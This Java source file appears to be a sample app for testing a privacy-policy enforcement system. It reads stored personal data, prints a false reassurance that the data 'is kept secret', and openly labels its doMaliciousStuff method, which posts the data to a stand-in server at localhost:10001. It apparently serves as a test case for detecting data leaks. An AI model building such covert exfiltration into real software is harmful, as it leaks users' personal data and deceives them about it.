package sap;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;

import com.sun.jersey.api.client.Client;
import com.sun.jersey.api.client.ClientResponse;
import com.sun.jersey.api.client.WebResource;
import com.sun.jersey.api.representation.Form;

import test.TestIntf;
import types.DelegateRequest;
import types.Utility;

/**
 * This sample application reads data from the PPL-database, prints it on the screen
 * and maliciously transmits it in the background to a remote server
 * 
 * @author alex
 *
 */

public class ExampleApp implements TestIntf {
	private String serverUrl = "http://localhost:8080/ppl-rest";

	private long piiId = 51474897663035531L;
	private String owner = "OwnerP";

	private PPLClient client;

	public ExampleApp() {
		this.client = new PPLClient(serverUrl);
	}

	public static void main(String[] args) throws IOException {
		ExampleApp m = new ExampleApp();
		// Deploy policy and PII
		m.deployPolicyAndPii("sample_ppl_policy-permitall.xml", "secret.txt");

		// Fetch Pii, print it on the console and furtively send it to remote
		// server
		File f = m.getPii();
		StringBuilder sb = Utility.readFile(f.getAbsolutePath());
		System.out.println("Everything ok your data \"" + sb.toString() + "\" is kept secret " + sb);
		m.doMaliciousStuff(sb);
		// m.test();
	}

	private void doMaliciousStuff(StringBuilder data) {
		try {
			Client client = Client.create();
			Form form = new Form();
			form.putSingle("payload", data);
			WebResource webResource = client.resource("http://localhost:10001");
			ClientResponse response = webResource.post(ClientResponse.class, form);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private File getPii() {
		DelegateRequest dr = new DelegateRequest();
		dr.setSubject(this.owner);
		dr.setResource(String.valueOf(this.piiId));
		return this.client.getPii(dr);
	}

	private void deployPolicyAndPii(String policyFile, String piiFile) {
		// read policy file
		StringBuilder sb = new StringBuilder();
		try {
			sb = Utility.readFile(policyFile);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		// read PII data
		File secret = Utility.searchFile(piiFile);

		// PPLClient client = new PPLClient(serverUrl);
		String response = this.client.sendPii(secret, sb.toString(), this.owner, null);
		this.piiId = Long.parseLong(response);
	}

	private void test() throws IOException {
		final FileInputStream fis = new FileInputStream("foo.txt");
		final FileOutputStream fos = new FileOutputStream("bar.txt");

		final byte[] buf = new byte[1000];
		int z = System.in.read();
		fis.read(buf); // source
		fos.write(buf); // sink
		System.out.println(z);
	}

	@Override
	public void runtest() {
		// TODO Auto-generated method stub
		try {
			ExampleApp.main(new String[] {});
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}
